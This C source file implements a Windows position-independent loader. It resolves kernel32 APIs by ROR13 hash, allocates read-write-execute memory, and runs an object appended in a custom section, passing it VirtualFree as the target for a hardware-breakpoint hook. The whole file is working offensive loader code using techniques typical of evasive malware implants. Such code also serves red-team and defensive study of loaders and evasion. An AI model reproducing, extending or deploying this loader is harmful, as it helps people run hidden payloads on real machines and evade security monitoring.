#include <windows.h>

#define KERNEL32DLL_HASH	0x6A4ABC5B
#define LOADLIBRARYA_HASH	0xEC0E4E8E
#define GETPROCADDRESS_HASH	0x7C0DFCAA
#define VIRTUALALLOC_HASH	0x91AFCA54
#define VIRTUALFREE_HASH    0x30633AC

typedef struct {
    __typeof__(LoadLibraryA)   * LoadLibraryA;
    __typeof__(GetProcAddress) * GetProcAddress;
    __typeof__(VirtualAlloc)   * VirtualAlloc;
    __typeof__(VirtualFree)    * VirtualFree;
} WIN32FUNCS;

// Function signatures, because the go() symbol must be first.
char * findAppendedPICO();
void findNeededFunctions(WIN32FUNCS * funcs);
char *findTargetFunction(WIN32FUNCS * funcs, unsigned int module_hash, unsigned int function_hash);
void run_hwbp_pico(WIN32FUNCS * funcs, char * srcPico, char *target_addr);

void go() {
    	// Resolve necessary WIN32 APIs.
	WIN32FUNCS funcs;
	findNeededFunctions(&funcs);
	
	// Get a pointer to the section containing our PICO.
	char *pico = findAppendedPICO();
	
	// For demonstrative purposes, we will set a breakpoint on KERNEL32$VirtualFree();
	char *target_addr = findTargetFunction(&funcs, 0x6A4ABC5B, 0x30633AC);
	
	// Run the PICO.
	run_hwbp_pico(&funcs, pico, target_addr);
}

// These header files must be included AFTER go() to ensure it's the first symbol in the PIC.
#include "headers/loader.h"
#include "headers/loaderdefs.h"
#include "headers/picorun.h"
#include "headers/resolve_eat.h"

char *findTargetFunction(WIN32FUNCS * funcs, unsigned int module_hash, unsigned int function_hash) {
	char * hModule = (char *)findModuleByHash(module_hash);
	return findFunctionByHash(hModule, function_hash);
}

void findNeededFunctions(WIN32FUNCS * funcs) {
	// Note that we resolve WIN32 APIs using ROR13 hashes of the function names, i.e. "VirtualAlloc" is 0x91AFCA54.
	char * hModule = (char *)findModuleByHash(KERNEL32DLL_HASH);

	funcs->LoadLibraryA   = (__typeof__(LoadLibraryA) *)   findFunctionByHash(hModule, LOADLIBRARYA_HASH);
	funcs->GetProcAddress = (__typeof__(GetProcAddress) *) findFunctionByHash(hModule, GETPROCADDRESS_HASH);
 	funcs->VirtualAlloc   = (__typeof__(VirtualAlloc) *)   findFunctionByHash(hModule, VIRTUALALLOC_HASH);
 	funcs->VirtualFree   = (__typeof__(VirtualFree) *)   findFunctionByHash(hModule, VIRTUALFREE_HASH);
}

void run_hwbp_pico(WIN32FUNCS * funcs, char * srcPico, char *target_addr) {
    char        * dstCode;
    char        * dstData;
     
    /* allocate memory for our PICO */
    dstData = funcs->VirtualAlloc( NULL, PicoDataSize(srcPico), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN,
                                                PAGE_READWRITE );
    dstCode = funcs->VirtualAlloc( NULL, PicoCodeSize(srcPico), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN,
                                            PAGE_EXECUTE_READWRITE );
  
    /* load our pico into our destination address, thanks! */
    PicoLoad((IMPORTFUNCS *)funcs, srcPico, dstCode, dstData);
  
    /* Call our pico entry point using the provided address. */
    PicoEntryPoint(srcPico, dstCode)(target_addr);
  
    /* free everything... */
    funcs->VirtualFree(dstData, 0, MEM_RELEASE);
    funcs->VirtualFree(dstCode, 0, MEM_RELEASE);
}

char __PICODATA__[0] __attribute__((section("hwbp_pico")));
  
char * findAppendedPICO() {
    return (char *)&__PICODATA__;
}
